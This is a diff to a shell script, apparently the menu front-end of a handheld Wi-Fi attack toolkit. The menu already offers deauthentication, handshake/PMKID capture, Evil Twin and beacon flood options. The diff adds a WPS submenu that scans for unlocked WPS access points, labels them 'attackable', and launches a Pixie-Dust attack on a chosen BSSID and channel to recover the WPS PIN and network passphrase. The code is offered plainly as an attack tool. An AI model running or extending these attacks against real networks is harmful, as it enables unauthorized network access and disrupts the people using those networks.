@@ -40,7 +40,7 @@ need() {
 theme_wifi() {
     need deauth.sh || return
     local a
-    a=$(LIST_PICKER "WiFi" "Air recon (APs/clients)" "Deauth a target" "Handshake/PMKID capture" "Evil Twin (clone AP)" "Beacon flood (SSID pool)" "Back" "Deauth a target") || return
+    a=$(LIST_PICKER "WiFi" "Air recon (APs/clients)" "Deauth a target" "Handshake/PMKID capture" "WPS (scan / pixie)" "Evil Twin (clone AP)" "Beacon flood (SSID pool)" "Back" "Deauth a target") || return
     case "$a" in
     "Air recon (APs/clients)")
         need airscout.sh || return
@@ -85,6 +85,31 @@ theme_wifi() {
         WAIT_FOR_BUTTON_PRESS B
         "$S/deauth.sh" --stop
         LOG "Deauth stopped."; ALERT "Deauth stopped"
+        ;;
+    "WPS (scan / pixie)")
+        need wpskit.sh || return
+        local w
+        w=$(LIST_PICKER "WPS" "Scan for WPS APs" "Pixie-Dust attack" "Back" "Scan for WPS APs") || return
+        case "$w" in
+        "Scan for WPS APs")
+            local secs; secs=$(NUMBER_PICKER "Scan seconds" "20") || return
+            LOG "Scanning for WPS-enabled APs (${secs}s)..."
+            LOG "$("$S/wpskit.sh" --scan --seconds "$secs" 2>&1)"
+            ALERT "WPS scan done - 'Lck No' = attackable"
+            ;;
+        "Pixie-Dust attack")
+            if [ -z "$(find_external_wifi)" ]; then
+                ERROR_DIALOG "WPS attack injects - plug the external A8000 in first (internal-radio attack is SSH-only via --force, hang risk)."
+                return
+            fi
+            local b c; b=$(MAC_PICKER "Target AP BSSID" "") || return
+            c=$(NUMBER_PICKER "Channel" "6") || return
+            CONFIRMATION_DIALOG "Pixie-Dust $b on ch $c?" || return
+            LOG "Running Pixie-Dust against $b..."
+            LOG "$("$S/wpskit.sh" --pixie --bssid "$b" --channel "$c" -y 2>&1 | tail -20)"
+            ALERT "Pixie-Dust finished - see log for PIN/PSK"
+            ;;
+        esac
         ;;
     "Evil Twin (clone AP)")
         need EvilTwin.sh || return
